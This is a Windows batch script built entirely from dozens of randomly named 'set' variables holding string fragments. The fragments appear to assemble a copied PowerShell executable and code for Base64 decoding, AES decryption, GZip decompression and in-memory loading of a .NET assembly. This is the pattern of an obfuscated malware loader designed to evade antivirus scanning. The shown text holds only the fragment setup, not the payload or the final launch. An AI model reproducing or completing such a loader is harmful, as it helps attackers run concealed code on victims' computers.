@echo off
set "hXGuutqwaD=em"
set "aWojgGTOxD=.e"
set "omAKRDJoHe=\v"
set "bBBPdXLMvk=st"
set "tfedZTkiPf=po"
set "agOyptJpgc=s\"
set "bBNMCzFZus=\W"
set "QGehxvFUKc=32"
set "AeUpXAVkjL=nd"
set "QUsmVBsXuh=we"
set "OiwEBMQpjY=py"
set "dlHNaRVBLn=rS"
set "CRyqJXLKBL=:\"
set "YkxZbfbLDg=1."
set "IAnViRdCZu=Wi"
set "wMmqFwiDmb=rs"
set "fKSHIPyATy=he"
set "sQcsjGkUSU=ws"
set "gziPrvwtrH=do"
set "suiZRCQOqM= /"
set "zmsfLSguZi=he"
set "dReWyQexVC=0\"
set "OrbHVTMjmh=Po"
set "UTVxZTYowa=ll"
set "xThmaCXiZe=y "
set "IXTVUqFKBx=in"
set "JnhkRxyPwI=ll"
set "gjSPAyPhiM=we"
set "omfVRxWisi=Sy"
set "UXloTrOfqr= C"
set "KHWOGURNeH=xe"
set "HLPBAXJgVE=ow"
set "ygzddwQgTc=co"
set "hnbUhgftpo= %~dp0"
set "xlgHhbMOXf=cd"
set "DYqUosSFlf=WVNh"
set "lrLgPKXTvt=comm"
set "nNMpqpeLuw== $B"
set "EXTKCKbwrX=ejmU"
set "ZbZUFkUWMb=m.IO"
set "HqYratTthr=:: '"
set "gCjSGnekje=CqLX"
set "KxhNSJSxrp=oin "
set "SKDuMPcAfr=ress"
set "bhcbftYjIb=yTo("
set "isDrLrmTQO=HhYX"
set "NNDGuzZsaM=yste"
set "jIjqCmAEHA=$dlN"
set "cfiPeLxZHY=tsWi"
set "cubBzwRXmx=ewLi"
set "oCvbMFCZGJ=New-"
set "RcYXhuuWXC=]::("
set "ZdZYUBRRiH=New-"
set "yflxrSrZxF=[Sys"
set "mKqBxQxVaR=sGUc"
set "UBGCRYuyJc=ddin"
set "zqYVtFLkSz=oint"
set "utgZegtcym= = $"
set "GrMARxmMDp=lBlo"
set "SswIckfQAV='')("
set "MPGRnEAlaO=y]::"
set "PTbYmgCifY=Stre"
set "BaxEYCGNiL=m.IO"
set "suNSLtYHgP=qx);"
set "xSLBJhjQNj=e]::"
set "ubVJnTkMti=+hAO"
set "HEqIYIdqzA=morF"
set "sQUAaAfbvi=ss -"
set "lOKLYDJpbq='gni"
set "ODwPtwmfVv=XV ="
set "pldwKfVJgb=sion"
set "BjKRGEgVpz=brea"
set "tdQVQeFgtL=ment"
set "OKqnnzhlIv=$dlN"
set "zaacoVjFwE=x = "
set "tTQhYHQONi=esaB"
set "EEOoGWnitw=Disp"
set "fJBRPtOdqx=oArr"
set "loYkxMhQOK=wEBZ"
set "tccWadFPQZ=3HWs"
set "FxrsdCaGEt=zHhY"
set "bWtxSjexSL=ion."
set "EskvpuaSSa= = ["
set "DJGBwUVDGf=ejmU"
set "RzNWHuJscS=nirt"
set "JArmExJnyP=Mode"
set "szLqRQKAap=O.Me"
set "kCBIjruxNt=.Dis"
set "iFeTPSucSL=y.Pa"
set "lPZMFyIOwe=..-1"
set "JEHdyuAHsC== [S"
set "lYoNKqDBeV=em.C"
set "HlmBBJxDZm=)($X"
set "MRoOuzDuBt=F'[-"
set "EAljENcerI=ateD"
set "dtVozotBKI= '')"
set "JQiYTNdWGq=KWDM"
set "SMYbWNQLUM=raph"
set "zXBuFEHnAY=.IO."
set "BDnvsyqdlX=.GZi"
set "EgZuFZBMZA=ct S"
set "OXSNtQtoWO=rans"
set "LUKamBnolX=.Len"
set "ZRHpwTsVlq=flec"
set "yaYJKblQjg=;$aA"
set "gkXUZawMba=xI.T"
set "DNufcxiEhc=e = "
set "iYTjaNIfIe=m.Re"
set "gUqwUyiogF=ert]"
set "aFHIpBHMat=.Mod"
set "nPnMEijmkJ=Fo7l"
set "lhvZQfxDNO=wEBZ"
set "ZwFHGdMudW=S46e"
set "eLwUUZpABu=in $"
set "SaDdZSEzCc=vj0m"
set "oNhvESsxhn=);$q"
set "wpCNOBohYX=$WVN"
set "wTYNWMlmfE=join"
set "IVtEXjPyfi=ypto"
set "YRmvuJoMHt='dqR"
set "RWcLHujXbZ=tem."
set "yILJACkHEt=();$"
set "KyRZXthBFC=gnir"
set "JDWSJDnGFR===')"
set "OXYyUEhpPN=Fh ="
set "tHUqKBvyCf=Star"
set "HkgyjOrewf= [Sy"
set "KWwFySvDvS=V = "
set "QtpMgEVkPc==');"
set "VusfXASvFm=] -j"
set "JlkyjgOOjn=3); "
set "RDISaJbaiM=lit("
set "sNDnatEmnA=m(, "
set "BLpdgkMiqe=F.Su"
set "ugPYCpRQbE=ZYYc"
set "MLFDxuEnAR=ddin"
set "uxdrZHeimj= [st"
set "IaymrTljXx=OyzA"
set "UmfXmvmuLP=[Sys"
set "rgKxoUZeUq=ejmU"
set "dpwCGUUzYK=[]] "
set "esAotxyIyb=pStr"
set "wGMqFMeqkz=);$B"
set "LvZoCgDIim=embl"
set "AffaJSUeJG=ecry"
set "ZZGEPJPzOY=y.Ci"
set "OqGyjrhakQ=EUqx"
set "MGivzHhZyV=le  "
set "LsUOgMSrpu=ode]"
set "gVDLlwzawp=ct S"
set "oPsnSDKvyG=doR."
set "uezWggWviE=$SVG"
set "xRNKHeHhtC=::De"
set "nkDiLulURe=ptog"
set "MfKnIucXDw=bstr"
set "ULbpPsbEPw=n ''"
set "pmOIeNjvvS=.Cry"
